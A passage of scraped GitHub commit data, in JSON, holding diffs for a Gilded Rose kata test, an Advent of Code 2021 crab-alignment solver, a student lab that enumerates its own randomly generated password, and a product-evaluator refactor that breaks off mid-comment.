self.quality)"},"\/test_gilded_rose.py":{"changes":[{"diff":"\n import unittest\n+import logging\n \n from GildedRoseJosep import GildedRoseJosep\n from gilded_rose import GildedRose\n from Item import Item\n \n-\n class GildedRoseTest(unittest.TestCase):\n \n-    names = [\n+    NAMES = [\n         \"Aged Brie\",\n         \"Backstage passes to a TAFKAL80ETC concert\",\n         \"Sulfuras, Hand of Ragnaros\",\n","add":2,"remove":2,"filename":"\/test_gilded_rose.py","badparts":["    names = ["],"goodparts":["import logging","    NAMES = ["]},{"diff":"\n     ]\n \n     def testBruteForce(self):\n-        iterations = 5\n+        days = 2\n \n         itemsOriginal = []\n+        itemsProcessed = []\n+        itemsProcessedOriginal = []\n \n         for i in range(-100, 100):\n             for j in range(-100, 100):\n-                for name in self.names:\n+                for name in self.NAMES:\n                     itemsOriginal.append(Item(name=name, sell_in=i, quality=j))\n+                    itemsProcessed.append(Item(name=name, sell_in=i, quality=j))\n+                    itemsProcessedOriginal.append(Item(name=name, sell_in=i, quality=j))\n \n-        itemsProcessed = itemsOriginal.copy()\n-\n-        for i in range(1, iterations):\n+        for i in range(1, days):\n             GildedRose(itemsOriginal).update_quality()\n             GildedRoseJosep(itemsProcessed).updateQuality()\n \n             for j in range(len(itemsOriginal) - 1):\n-                if itemsOriginal[i].quality != itemsProcessed[i].quality or \\\n-                        itemsOriginal[i].sell_in != itemsProcessed[i].sell_in:\n-                    print(itemsOriginal[i])\n-                    print(itemsProcessed[i])\n-                    self.assertEqual(itemsOriginal[i].quality, itemsProcessed[i].quality)\n-                    self.assertEqual(itemsOriginal[i].sell_in, itemsProcessed[i].sell_in)\n+                if itemsOriginal[j].quality != itemsProcessed[j].quality or \\\n+                        itemsOriginal[j].sell_in != itemsProcessed[j].sell_in:\n+                    print(\"------ \" + i.__str__() + \" ------\")\n+                    print(\"Item original:\" + itemsOriginal[j].__repr__())\n+                    print(\"Item processed original:\" + itemsProcessedOriginal[j].__repr__())\n+                    print(\"Item processed:\" + itemsProcessed[j].__repr__())\n+                    self.assertEqual(itemsOriginal[j].quality, itemsProcessed[j].quality)\n+                    self.assertEqual(itemsOriginal[j].sell_in, itemsProcessed[j].sell_in)\n \n \n if __name__ == '__main__':\n","add":15,"remove":11,"filename":"\/test_gilded_rose.py","badparts":["        iterations = 5","                for name in self.names:","        itemsProcessed = itemsOriginal.copy()","        for i in range(1, iterations):","                if itemsOriginal[i].quality != itemsProcessed[i].quality or \\","                        itemsOriginal[i].sell_in != itemsProcessed[i].sell_in:","                    print(itemsOriginal[i])","                    print(itemsProcessed[i])","                    self.assertEqual(itemsOriginal[i].quality, itemsProcessed[i].quality)","                    self.assertEqual(itemsOriginal[i].sell_in, itemsProcessed[i].sell_in)"],"goodparts":["        days = 2","        itemsProcessed = []","        itemsProcessedOriginal = []","                for name in self.NAMES:","                    itemsProcessed.append(Item(name=name, sell_in=i, quality=j))","                    itemsProcessedOriginal.append(Item(name=name, sell_in=i, quality=j))","        for i in range(1, days):","                if itemsOriginal[j].quality != itemsProcessed[j].quality or \\","                        itemsOriginal[j].sell_in != itemsProcessed[j].sell_in:","                    print(\"------ \" + i.__str__() + \" ------\")","                    print(\"Item original:\" + itemsOriginal[j].__repr__())","                    print(\"Item processed original:\" + itemsProcessedOriginal[j].__repr__())","                    print(\"Item processed:\" + itemsProcessed[j].__repr__())","                    self.assertEqual(itemsOriginal[j].quality, itemsProcessed[j].quality)","                    self.assertEqual(itemsOriginal[j].sell_in, itemsProcessed[j].sell_in)"]}],"source":"\nimport unittest from GildedRoseJosep import GildedRoseJosep from gilded_rose import GildedRose from Item import Item class GildedRoseTest(unittest.TestCase): names=[ \"Aged Brie\", \"Backstage passes to a TAFKAL80ETC concert\", \"Sulfuras, Hand of Ragnaros\", \"\" ] def testBruteForce(self): iterations=5 itemsOriginal=[] for i in range(-100, 100): for j in range(-100, 100): for name in self.names: itemsOriginal.append(Item(name=name, sell_in=i, quality=j)) itemsProcessed=itemsOriginal.copy() for i in range(1, iterations): GildedRose(itemsOriginal).update_quality() GildedRoseJosep(itemsProcessed).updateQuality() for j in range(len(itemsOriginal) -1): if itemsOriginal[i].quality !=itemsProcessed[i].quality or \\ itemsOriginal[i].sell_in !=itemsProcessed[i].sell_in: print(itemsOriginal[i]) print(itemsProcessed[i]) self.assertEqual(itemsOriginal[i].quality, itemsProcessed[i].quality) self.assertEqual(itemsOriginal[i].sell_in, itemsProcessed[i].sell_in) if __name__=='__main__': unittest.main() ","sourceWithComments":"import unittest\n\nfrom GildedRoseJosep import GildedRoseJosep\nfrom gilded_rose import GildedRose\nfrom Item import Item\n\n\nclass GildedRoseTest(unittest.TestCase):\n\n    names = [\n        \"Aged Brie\",\n        \"Backstage passes to a TAFKAL80ETC concert\",\n        \"Sulfuras, Hand of Ragnaros\",\n        \"\"\n    ]\n\n    def testBruteForce(self):\n        iterations = 5\n\n        itemsOriginal = []\n\n        for i in range(-100, 100):\n            for j in range(-100, 100):\n                for name in self.names:\n                    itemsOriginal.append(Item(name=name, sell_in=i, quality=j))\n\n        itemsProcessed = itemsOriginal.copy()\n\n        for i in range(1, iterations):\n            GildedRose(itemsOriginal).update_quality()\n            GildedRoseJosep(itemsProcessed).updateQuality()\n\n            for j in range(len(itemsOriginal) - 1):\n                if itemsOriginal[i].quality != itemsProcessed[i].quality or \\\n                        itemsOriginal[i].sell_in != itemsProcessed[i].sell_in:\n                    print(itemsOriginal[i])\n                    print(itemsProcessed[i])\n                    self.assertEqual(itemsOriginal[i].quality, itemsProcessed[i].quality)\n                    self.assertEqual(itemsOriginal[i].sell_in, itemsProcessed[i].sell_in)\n\n\nif __name__ == '__main__':\n    unittest.main()\n"}},"msg":"Fix and improve Brute Force Test.\nFix item increase and decrease methods."}},"https:\/\/github.com\/mer-sublime\/advent-of-code":{"563665307782b73fb190dd15f671e354e8c82713":{"url":"https:\/\/api.github.com\/repos\/mer-sublime\/advent-of-code\/commits\/563665307782b73fb190dd15f671e354e8c82713","html_url":"https:\/\/github.com\/mer-sublime\/advent-of-code\/commit\/563665307782b73fb190dd15f671e354e8c82713","message":"2021\/07 with mean + improve brute force.","sha":"563665307782b73fb190dd15f671e354e8c82713","keyword":"brute force improve","diff":"diff --git a\/2021\/07\/crab_sorting.py b\/2021\/07\/crab_sorting.py\nindex 9e18f9b..806ae01 100644\n--- a\/2021\/07\/crab_sorting.py\n+++ b\/2021\/07\/crab_sorting.py\n@@ -1,56 +1,73 @@\n \"\"\"https:\/\/adventofcode.com\/2021\/day\/7\"\"\"\n+import math\n+import statistics\n from unittest import TestCase\n-import statistics, math\n \n INPUT_FILE = 'input.txt'\n TEST_INPUT_FILE = 'test_input.txt'\n \n \n+def triangular_sum(n):\n+    return n * (n + 1) \/\/ 2\n+\n+\n class CrabSorting:\n     def __init__(self, test=False):\n         self.input = TEST_INPUT_FILE if test else INPUT_FILE\n-\n-    def part_one(self):\n         with open(self.input, 'r') as f:\n-            crabs = list(map(int, f.readline().split(',')))\n+            self.crabs = list(map(int, f.readline().split(',')))\n \n-            # Find median position\n-            target_position = statistics.median(crabs)\n-            #\n-            # crabs.sort()\n-            # n_crabs = len(crabs)\n-            # if n_crabs % 2:\n-            #     median_position = crabs[int((n_crabs + 1) \/ 2)]\n-            # else:\n-            #     median_position = crabs[int(n_crabs \/ 2)]\n+    def find_fuel_cost(self, pos):\n+        \"\"\"n steps require n fuel units.\"\"\"\n+        return sum([abs(crab - pos) for crab in self.crabs])\n \n-            # Return the sum of steps needed by each crab to reach target position\n-            return sum([abs(crab - target_position) for crab in crabs])\n+    def find_fuel_cost_triangular(self, pos):\n+        \"\"\"n steps require n x (n + 1) \/ 2 fuel units.\"\"\"\n+        # return sum([sum(range(abs(crab - pos) + 1)) for crab in self.crabs])\n+        return sum([triangular_sum(abs(crab - pos)) for crab in self.crabs])\n+\n+    def part_one(self):\n+        \"\"\"Find how much fuel is needed by each crab to reach target position.\"\"\"\n+        return self.find_fuel_cost(pos=int(statistics.median(self.crabs)))\n \n     def part_two(self):\n-        with open(self.input, 'r') as f:\n-            crabs = list(map(int, f.readline().split(',')))\n-\n-            # Find all possible values for target position.\n-            possible_crab_positions = range(min(crabs), max(crabs) + 1)\n-\n-            # Try them all. Brute force rocks.\n-            for target_position in possible_crab_positions:\n-                # Return the amount of fuel needed by each crab to reach target position\n-                fuel = sum([sum(range(abs(crab - target_position) + 1)) for crab in crabs])\n-                # Is it our best result yet?\n-                if 'best_result' not in locals() or fuel < best_result:\n-                    best_result = fuel\n-            return best_result\n-\n-    # def part_two(self):\n-    #     with open(self.input, 'r') as f:\n-    #         crabs = list(map(int, f.readline().split(',')))\n-    #\n-    #         square_crabs = None\n-    #         avg_crab = round(math.sqrt(round(sum(square_crabs) \/ len(crabs))))\n-    #\n-    #         return sum([sum(range(abs(crab - avg_crab) + 1)) for crab in crabs])\n+        \"\"\"Find how much fuel is needed by each crab to reach target position.\"\"\"\n+        mean = statistics.mean(self.crabs)\n+        floor_mean, ceil_mean = math.floor(mean), math.ceil(mean)\n+\n+        # print(f'{mean = }')\n+        # print(f'Floor: {floor_mean} -> {self.find_fuel_cost_triangular(pos=floor_mean)}')\n+        # print(f'Ceil: {ceil_mean} -> {self.find_fuel_cost_triangular(pos=ceil_mean)}')\n+\n+        return min(\n+            self.find_fuel_cost_triangular(pos=floor_mean),\n+            self.find_fuel_cost_triangular(pos=ceil_mean)\n+        )\n+\n+    def part_two_brute_force_for(self):\n+        # Find all potential target positions.\n+        positions = range(min(self.crabs), max(self.crabs) + 1)\n+\n+        # Try them all. Brute force rocks.\n+        for pos in positions:\n+            # Find the amount of fuel needed for all crabs to reach target position.\n+            fuel = self.find_fuel_cost_triangular(pos=pos)\n+\n+            # Keep the lowest value.\n+            best_result = min(fuel, best_result) if 'best_result' in locals() else fuel\n+\n+            if fuel > best_result:    # When the result gets worse, return the previous value.\n+                return best_result\n+\n+    def part_two_brute_force_while(self):\n+        pos = min(self.crabs)\n+        fuel = self.find_fuel_cost_triangular(pos)\n+        # Try all possible positions until the fuel value stops decreasing.\n+        while fuel >= (next_fuel := self.find_fuel_cost_triangular(pos + 1)):\n+            pos += 1\n+            fuel = next_fuel    # Save next result for the next iteration.\n+\n+        return fuel\n \n \n class TestCrabSorting(TestCase):\n@@ -60,7 +77,13 @@ def test_part_one(self):\n     def test_part_two(self):\n         self.assertEqual(CrabSorting(test=True).part_two(), 168)\n \n+    def test_part_two_brute_force(self):\n+        self.assertEqual(CrabSorting(test=True).part_two_brute_force_for(), 168)\n+        self.assertEqual(CrabSorting(test=True).part_two_brute_force_while(), 168)\n+\n \n if __name__ == \"__main__\":\n     print('Part One:', CrabSorting().part_one())\n     print('Part Two:', CrabSorting().part_two())\n+    print('Part Two (BF for):', CrabSorting().part_two_brute_force_for())\n+    print('Part Two (BF while):', CrabSorting().part_two_brute_force_while())\n","files":{"\/2021\/07\/crab_sorting.py":{"changes":[{"diff":"\n \"\"\"https:\/\/adventofcode.com\/2021\/day\/7\"\"\"\n+import math\n+import statistics\n from unittest import TestCase\n-import statistics, math\n \n INPUT_FILE = 'input.txt'\n TEST_INPUT_FILE = 'test_input.txt'\n \n \n+def triangular_sum(n):\n+    return n * (n + 1) \/\/ 2\n+\n+\n class CrabSorting:\n     def __init__(self, test=False):\n         self.input = TEST_INPUT_FILE if test else INPUT_FILE\n-\n-    def part_one(self):\n         with open(self.input, 'r') as f:\n-            crabs = list(map(int, f.readline().split(',')))\n+            self.crabs = list(map(int, f.readline().split(',')))\n \n-            # Find median position\n-            target_position = statistics.median(crabs)\n-            #\n-            # crabs.sort()\n-            # n_crabs = len(crabs)\n-            # if n_crabs % 2:\n-            #     median_position = crabs[int((n_crabs + 1) \/ 2)]\n-            # else:\n-            #     median_position = crabs[int(n_crabs \/ 2)]\n+    def find_fuel_cost(self, pos):\n+        \"\"\"n steps require n fuel units.\"\"\"\n+        return sum([abs(crab - pos) for crab in self.crabs])\n \n-            # Return the sum of steps needed by each crab to reach target position\n-            return sum([abs(crab - target_position) for crab in crabs])\n+    def find_fuel_cost_triangular(self, pos):\n+        \"\"\"n steps require n x (n + 1) \/ 2 fuel units.\"\"\"\n+        # return sum([sum(range(abs(crab - pos) + 1)) for crab in self.crabs])\n+        return sum([triangular_sum(abs(crab - pos)) for crab in self.crabs])\n+\n+    def part_one(self):\n+        \"\"\"Find how much fuel is needed by each crab to reach target position.\"\"\"\n+        return self.find_fuel_cost(pos=int(statistics.median(self.crabs)))\n \n     def part_two(self):\n-        with open(self.input, 'r') as f:\n-            crabs = list(map(int, f.readline().split(',')))\n-\n-            # Find all possible values for target position.\n-            possible_crab_positions = range(min(crabs), max(crabs) + 1)\n-\n-            # Try them all. Brute force rocks.\n-            for target_position in possible_crab_positions:\n-                # Return the amount of fuel needed by each crab to reach target position\n-                fuel = sum([sum(range(abs(crab - target_position) + 1)) for crab in crabs])\n-                # Is it our best result yet?\n-                if 'best_result' not in locals() or fuel < best_result:\n-                    best_result = fuel\n-            return best_result\n-\n-    # def part_two(self):\n-    #     with open(self.input, 'r') as f:\n-    #         crabs = list(map(int, f.readline().split(',')))\n-    #\n-    #         square_crabs = None\n-    #         avg_crab = round(math.sqrt(round(sum(square_crabs) \/ len(crabs))))\n-    #\n-    #         return sum([sum(range(abs(crab - avg_crab) + 1)) for crab in crabs])\n+        \"\"\"Find how much fuel is needed by each crab to reach target position.\"\"\"\n+        mean = statistics.mean(self.crabs)\n+        floor_mean, ceil_mean = math.floor(mean), math.ceil(mean)\n+\n+        # print(f'{mean = }')\n+        # print(f'Floor: {floor_mean} -> {self.find_fuel_cost_triangular(pos=floor_mean)}')\n+        # print(f'Ceil: {ceil_mean} -> {self.find_fuel_cost_triangular(pos=ceil_mean)}')\n+\n+        return min(\n+            self.find_fuel_cost_triangular(pos=floor_mean),\n+            self.find_fuel_cost_triangular(pos=ceil_mean)\n+        )\n+\n+    def part_two_brute_force_for(self):\n+        # Find all potential target positions.\n+        positions = range(min(self.crabs), max(self.crabs) + 1)\n+\n+        # Try them all. Brute force rocks.\n+        for pos in positions:\n+            # Find the amount of fuel needed for all crabs to reach target position.\n+            fuel = self.find_fuel_cost_triangular(pos=pos)\n+\n+            # Keep the lowest value.\n+            best_result = min(fuel, best_result) if 'best_result' in locals() else fuel\n+\n+            if fuel > best_result:    # When the result gets worse, return the previous value.\n+                return best_result\n+\n+    def part_two_brute_force_while(self):\n+        pos = min(self.crabs)\n+        fuel = self.find_fuel_cost_triangular(pos)\n+        # Try all possible positions until the fuel value stops decreasing.\n+        while fuel >= (next_fuel := self.find_fuel_cost_triangular(pos + 1)):\n+            pos += 1\n+            fuel = next_fuel    # Save next result for the next iteration.\n+\n+        return fuel\n \n \n class TestCrabSorting(TestCase):\n","add":55,"remove":38,"filename":"\/2021\/07\/crab_sorting.py","badparts":["import statistics, math","    def part_one(self):","            crabs = list(map(int, f.readline().split(',')))","            target_position = statistics.median(crabs)","            return sum([abs(crab - target_position) for crab in crabs])","        with open(self.input, 'r') as f:","            crabs = list(map(int, f.readline().split(',')))","            possible_crab_positions = range(min(crabs), max(crabs) + 1)","            for target_position in possible_crab_positions:","                fuel = sum([sum(range(abs(crab - target_position) + 1)) for crab in crabs])","                if 'best_result' not in locals() or fuel < best_result:","                    best_result = fuel","            return best_result"],"goodparts":["import math","import statistics","def triangular_sum(n):","    return n * (n + 1) \/\/ 2","            self.crabs = list(map(int, f.readline().split(',')))","    def find_fuel_cost(self, pos):","        \"\"\"n steps require n fuel units.\"\"\"","        return sum([abs(crab - pos) for crab in self.crabs])","    def find_fuel_cost_triangular(self, pos):","        \"\"\"n steps require n x (n + 1) \/ 2 fuel units.\"\"\"","        return sum([triangular_sum(abs(crab - pos)) for crab in self.crabs])","    def part_one(self):","        \"\"\"Find how much fuel is needed by each crab to reach target position.\"\"\"","        return self.find_fuel_cost(pos=int(statistics.median(self.crabs)))","        \"\"\"Find how much fuel is needed by each crab to reach target position.\"\"\"","        mean = statistics.mean(self.crabs)","        floor_mean, ceil_mean = math.floor(mean), math.ceil(mean)","        return min(","            self.find_fuel_cost_triangular(pos=floor_mean),","            self.find_fuel_cost_triangular(pos=ceil_mean)","        )","    def part_two_brute_force_for(self):","        positions = range(min(self.crabs), max(self.crabs) + 1)","        for pos in positions:","            fuel = self.find_fuel_cost_triangular(pos=pos)","            best_result = min(fuel, best_result) if 'best_result' in locals() else fuel","            if fuel > best_result:    # When the result gets worse, return the previous value.","                return best_result","    def part_two_brute_force_while(self):","        pos = min(self.crabs)","        fuel = self.find_fuel_cost_triangular(pos)","        while fuel >= (next_fuel := self.find_fuel_cost_triangular(pos + 1)):","            pos += 1","            fuel = next_fuel    # Save next result for the next iteration.","        return fuel"]}],"source":"\n\"\"\"https:\/\/adventofcode.com\/2021\/day\/7\"\"\" from unittest import TestCase import statistics, math INPUT_FILE='input.txt' TEST_INPUT_FILE='test_input.txt' class CrabSorting: def __init__(self, test=False): self.input=TEST_INPUT_FILE if test else INPUT_FILE def part_one(self): with open(self.input, 'r') as f: crabs=list(map(int, f.readline().split(','))) target_position=statistics.median(crabs) return sum([abs(crab -target_position) for crab in crabs]) def part_two(self): with open(self.input, 'r') as f: crabs=list(map(int, f.readline().split(','))) possible_crab_positions=range(min(crabs), max(crabs) +1) for target_position in possible_crab_positions: fuel=sum([sum(range(abs(crab -target_position) +1)) for crab in crabs]) if 'best_result' not in locals() or fuel < best_result: best_result=fuel return best_result class TestCrabSorting(TestCase): def test_part_one(self): self.assertEqual(CrabSorting(test=True).part_one(), 37) def test_part_two(self): self.assertEqual(CrabSorting(test=True).part_two(), 168) if __name__==\"__main__\": print('Part One:', CrabSorting().part_one()) print('Part Two:', CrabSorting().part_two()) ","sourceWithComments":"\"\"\"https:\/\/adventofcode.com\/2021\/day\/7\"\"\"\nfrom unittest import TestCase\nimport statistics, math\n\nINPUT_FILE = 'input.txt'\nTEST_INPUT_FILE = 'test_input.txt'\n\n\nclass CrabSorting:\n    def __init__(self, test=False):\n        self.input = TEST_INPUT_FILE if test else INPUT_FILE\n\n    def part_one(self):\n        with open(self.input, 'r') as f:\n            crabs = list(map(int, f.readline().split(',')))\n\n            # Find median position\n            target_position = statistics.median(crabs)\n            #\n            # crabs.sort()\n            # n_crabs = len(crabs)\n            # if n_crabs % 2:\n            #     median_position = crabs[int((n_crabs + 1) \/ 2)]\n            # else:\n            #     median_position = crabs[int(n_crabs \/ 2)]\n\n            # Return the sum of steps needed by each crab to reach target position\n            return sum([abs(crab - target_position) for crab in crabs])\n\n    def part_two(self):\n        with open(self.input, 'r') as f:\n            crabs = list(map(int, f.readline().split(',')))\n\n            # Find all possible values for target position.\n            possible_crab_positions = range(min(crabs), max(crabs) + 1)\n\n            # Try them all. Brute force rocks.\n            for target_position in possible_crab_positions:\n                # Return the amount of fuel needed by each crab to reach target position\n                fuel = sum([sum(range(abs(crab - target_position) + 1)) for crab in crabs])\n                # Is it our best result yet?\n                if 'best_result' not in locals() or fuel < best_result:\n                    best_result = fuel\n            return best_result\n\n    # def part_two(self):\n    #     with open(self.input, 'r') as f:\n    #         crabs = list(map(int, f.readline().split(',')))\n    #\n    #         square_crabs = None\n    #         avg_crab = round(math.sqrt(round(sum(square_crabs) \/ len(crabs))))\n    #\n    #         return sum([sum(range(abs(crab - avg_crab) + 1)) for crab in crabs])\n\n\nclass TestCrabSorting(TestCase):\n    def test_part_one(self):\n        self.assertEqual(CrabSorting(test=True).part_one(), 37)\n\n    def test_part_two(self):\n        self.assertEqual(CrabSorting(test=True).part_two(), 168)\n\n\nif __name__ == \"__main__\":\n    print('Part One:', CrabSorting().part_one())\n    print('Part Two:', CrabSorting().part_two())\n"}},"msg":"2021\/07 with mean + improve brute force."}},"https:\/\/github.com\/VasKho\/MaMEIS-Labs":{"fc3cac057304fd1e11eecf7c9f54f7dbef783b88":{"url":"https:\/\/api.github.com\/repos\/VasKho\/MaMEIS-Labs\/commits\/fc3cac057304fd1e11eecf7c9f54f7dbef783b88","html_url":"https:\/\/github.com\/VasKho\/MaMEIS-Labs\/commit\/fc3cac057304fd1e11eecf7c9f54f7dbef783b88","message":"Improve brute force algo","sha":"fc3cac057304fd1e11eecf7c9f54f7dbef783b88","keyword":"brute force improve","diff":"diff --git a\/Lab_1\/password_generator.py b\/Lab_1\/password_generator.py\nindex 6274f8d..468a4b3 100644\n--- a\/Lab_1\/password_generator.py\n+++ b\/Lab_1\/password_generator.py\n@@ -1,40 +1,40 @@\n import random\n+import itertools\n \n \n def generate_password(length: int, chars: str) -> str:\n     password = ''\n     for _ in range(length):\n-        password = password + random.choice(list(chars))\n+        password += random.choice(list(chars))\n     return password\n \n \n def brute_force(length: int, chars: str, correct_password: str) -> None:\n-    wrong_passwords = []\n-    while True:\n-        password = ''\n-    \n-        for _ in range(length):\n-            password += random.choice(list(chars))\n-     \n-        if password not in wrong_passwords:\n-            if password != correct_password:\n-                wrong_passwords.append(password)\n-            else:\n-                print(password)\n-                break\n+    password = itertools.product(chars, repeat = length)\n+    for i in password:\n+        str = ''.join(i)\n+        if str == correct_password:\n+            print(str)\n+            break\n \n \n if __name__ == '__main__':\n     chars = '\u0410\u0411\u0412\u0413\u0414\u0415\u0401\u0416\u0417\u0418\u0419\u041a\u041b\u041c\u041d\u041e\u041f\u0420\u0421\u0422\u0423\u0424\u0425\u0426\u0427\u0428\u0429\u042c\u042b\u042a\u042d\u042e\u042f\u0430\u0431\u0432\u0433\u0434\u0435\u0451\u0436\u0437\u0438\u0439\u043a\u043b\u043c\u043d\u043e\u043f\u0440\u0441\u0442\u0443\u0444\u0445\u0446\u0447\u0448\u0449\u044c\u044b\u044a\u044d\u044e\u044f0123456789'\n-    length = input('Enter password length: ')\n+    length = int(input('Enter password length: '))\n \n     hitrate = dict.fromkeys(chars, 0)\n \n     for i in range(10000):\n-        user_password = generate_password(int(length), chars)\n+        user_password = generate_password(length, chars)\n         for elem in user_password:\n             hitrate[elem] += 1\n \n     for char in hitrate:\n         if hitrate[char] > 0:\n             print(char, hitrate[char])\n+\n+    passwd = generate_password(length, chars)\n+    print(passwd)\n+\n+\n+    brute_force(int(length), chars, passwd)\n","files":{"\/Lab_1\/password_generator.py":{"changes":[{"diff":"\n import random\n+import itertools\n \n \n def generate_password(length: int, chars: str) -> str:\n     password = ''\n     for _ in range(length):\n-        password = password + random.choice(list(chars))\n+        password += random.choice(list(chars))\n     return password\n \n \n def brute_force(length: int, chars: str, correct_password: str) -> None:\n-    wrong_passwords = []\n-    while True:\n-        password = ''\n-    \n-        for _ in range(length):\n-            password += random.choice(list(chars))\n-     \n-        if password not in wrong_passwords:\n-            if password != correct_password:\n-                wrong_passwords.append(password)\n-            else:\n-                print(password)\n-                break\n+    password = itertools.product(chars, repeat = length)\n+    for i in password:\n+        str = ''.join(i)\n+        if str == correct_password:\n+            print(str)\n+            break\n \n \n if __name__ == '__main__':\n     chars = '\u0410\u0411\u0412\u0413\u0414\u0415\u0401\u0416\u0417\u0418\u0419\u041a\u041b\u041c\u041d\u041e\u041f\u0420\u0421\u0422\u0423\u0424\u0425\u0426\u0427\u0428\u0429\u042c\u042b\u042a\u042d\u042e\u042f\u0430\u0431\u0432\u0433\u0434\u0435\u0451\u0436\u0437\u0438\u0439\u043a\u043b\u043c\u043d\u043e\u043f\u0440\u0441\u0442\u0443\u0444\u0445\u0446\u0447\u0448\u0449\u044c\u044b\u044a\u044d\u044e\u044f0123456789'\n-    length = input('Enter password length: ')\n+    length = int(input('Enter password length: '))\n \n     hitrate = dict.fromkeys(chars, 0)\n \n     for i in range(10000):\n-        user_password = generate_password(int(length), chars)\n+        user_password = generate_password(length, chars)\n         for elem in user_password:\n             hitrate[elem] += 1\n \n     for char in hitrate:\n         if hitrate[char] > 0:\n             print(char, hitrate[char])\n+\n+    passwd = generate_password(length, chars)\n+    print(passwd)\n+\n+\n+    brute_force(int(length), chars, passwd)\n","add":16,"remove":16,"filename":"\/Lab_1\/password_generator.py","badparts":["        password = password + random.choice(list(chars))","    wrong_passwords = []","    while True:","        password = ''","        for _ in range(length):","            password += random.choice(list(chars))","        if password not in wrong_passwords:","            if password != correct_password:","                wrong_passwords.append(password)","            else:","                print(password)","                break","    length = input('Enter password length: ')","        user_password = generate_password(int(length), chars)"],"goodparts":["import itertools","        password += random.choice(list(chars))","    password = itertools.product(chars, repeat = length)","    for i in password:","        str = ''.join(i)","        if str == correct_password:","            print(str)","            break","    length = int(input('Enter password length: '))","        user_password = generate_password(length, chars)","    passwd = generate_password(length, chars)","    print(passwd)","    brute_force(int(length), chars, passwd)"]}],"source":"\nimport random def generate_password(length: int, chars: str) -> str: password='' for _ in range(length): password=password +random.choice(list(chars)) return password def brute_force(length: int, chars: str, correct_password: str) -> None: wrong_passwords=[] while True: password='' for _ in range(length): password +=random.choice(list(chars)) if password not in wrong_passwords: if password !=correct_password: wrong_passwords.append(password) else: print(password) break if __name__=='__main__': chars='\u0410\u0411\u0412\u0413\u0414\u0415\u0401\u0416\u0417\u0418\u0419\u041a\u041b\u041c\u041d\u041e\u041f\u0420\u0421\u0422\u0423\u0424\u0425\u0426\u0427\u0428\u0429\u042c\u042b\u042a\u042d\u042e\u042f\u0430\u0431\u0432\u0433\u0434\u0435\u0451\u0436\u0437\u0438\u0439\u043a\u043b\u043c\u043d\u043e\u043f\u0440\u0441\u0442\u0443\u0444\u0445\u0446\u0447\u0448\u0449\u044c\u044b\u044a\u044d\u044e\u044f0123456789' length=input('Enter password length: ') hitrate=dict.fromkeys(chars, 0) for i in range(10000): user_password=generate_password(int(length), chars) for elem in user_password: hitrate[elem] +=1 for char in hitrate: if hitrate[char] > 0: print(char, hitrate[char]) ","sourceWithComments":"import random\n\n\ndef generate_password(length: int, chars: str) -> str:\n    password = ''\n    for _ in range(length):\n        password = password + random.choice(list(chars))\n    return password\n\n\ndef brute_force(length: int, chars: str, correct_password: str) -> None:\n    wrong_passwords = []\n    while True:\n        password = ''\n    \n        for _ in range(length):\n            password += random.choice(list(chars))\n     \n        if password not in wrong_passwords:\n            if password != correct_password:\n                wrong_passwords.append(password)\n            else:\n                print(password)\n                break\n\n\nif __name__ == '__main__':\n    chars = '\u0410\u0411\u0412\u0413\u0414\u0415\u0401\u0416\u0417\u0418\u0419\u041a\u041b\u041c\u041d\u041e\u041f\u0420\u0421\u0422\u0423\u0424\u0425\u0426\u0427\u0428\u0429\u042c\u042b\u042a\u042d\u042e\u042f\u0430\u0431\u0432\u0433\u0434\u0435\u0451\u0436\u0437\u0438\u0439\u043a\u043b\u043c\u043d\u043e\u043f\u0440\u0441\u0442\u0443\u0444\u0445\u0446\u0447\u0448\u0449\u044c\u044b\u044a\u044d\u044e\u044f0123456789'\n    length = input('Enter password length: ')\n\n    hitrate = dict.fromkeys(chars, 0)\n\n    for i in range(10000):\n        user_password = generate_password(int(length), chars)\n        for elem in user_password:\n            hitrate[elem] += 1\n\n    for char in hitrate:\n        if hitrate[char] > 0:\n            print(char, hitrate[char])\n"}},"msg":"Improve brute force algo"}},"https:\/\/github.com\/alemolteni\/team4_projectOLA":{"95f9b94a2fed403e00717ab10523fd3de2bfe51a":{"url":"https:\/\/api.github.com\/repos\/alemolteni\/team4_projectOLA\/commits\/95f9b94a2fed403e00717ab10523fd3de2bfe51a","html_url":"https:\/\/github.com\/alemolteni\/team4_projectOLA\/commit\/95f9b94a2fed403e00717ab10523fd3de2bfe51a","message":"Improved efficiency of brute force (convert_units param)","sha":"95f9b94a2fed403e00717ab10523fd3de2bfe51a","keyword":"brute force improve","diff":"diff --git a\/Model\/Evaluator\/Baseline.py b\/Model\/Evaluator\/Baseline.py\nindex a5b93e1..340e7ba 100644\n--- a\/Model\/Evaluator\/Baseline.py\n+++ b\/Model\/Evaluator\/Baseline.py\n@@ -3,9 +3,9 @@\n \r\n \r\n class Baseline(Evaluator):\r\n-    def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], alphas=[], margins=[], units_mean=[], verbose=False):\r\n+    def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], alphas=[], margins=[], units_mean=[], convert_units=True, verbose=False):\r\n             super(Baseline, self).__init__(products_list=products_list, click_prob_matrix=click_prob_matrix, lambda_prob=lambda_prob, conversion_rates=conversion_rates, \r\n-                alphas=alphas, margins=margins, units_mean=units_mean, verbose=verbose)\r\n+                alphas=alphas, margins=margins, units_mean=units_mean, convert_units=convert_units, verbose=verbose)\r\n \r\n     def computeMargin(self):\r\n         return np.multiply(np.multiply(np.multiply(self.margins,self.units_mean),self.conversion_rates),self.alphas).sum()\r\ndiff --git a\/Model\/Evaluator\/Evaluator.py b\/Model\/Evaluator\/Evaluator.py\nindex 1c1d773..de9c694 100644\n--- a\/Model\/Evaluator\/Evaluator.py\n+++ b\/Model\/Evaluator\/Evaluator.py\n@@ -3,11 +3,12 @@\n \r\n class Evaluator:\r\n     def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, conversion_rates=[], \r\n-                alphas=[], margins=[], verbose=False, units_mean=[]):\r\n+                alphas=[], margins=[], verbose=False, units_mean=None, convert_units=True):\r\n         assert len(products_list) == len(conversion_rates) and len(products_list) == len(alphas)\r\n         assert len(products_list) == len(margins)\r\n         assert len(alphas) == len(units_mean)\r\n         assert click_prob_matrix is not None\r\n+        assert units_mean is not None\r\n \r\n         self.click_prob_matrix = np.array(click_prob_matrix).tolist()\r\n         self.products_list = products_list\r\n@@ -26,12 +27,15 @@ def __init__(self, products_list=[], click_prob_matrix=None, lambda_prob=0.5, co\n         #       E.G. np.ceil(np.random.gamma(.95, 1, size=1000000)).mean() ---> mean = 1.541436\r\n         #       If I repeat the process 10 times then std = 0.0011484\r\n         #       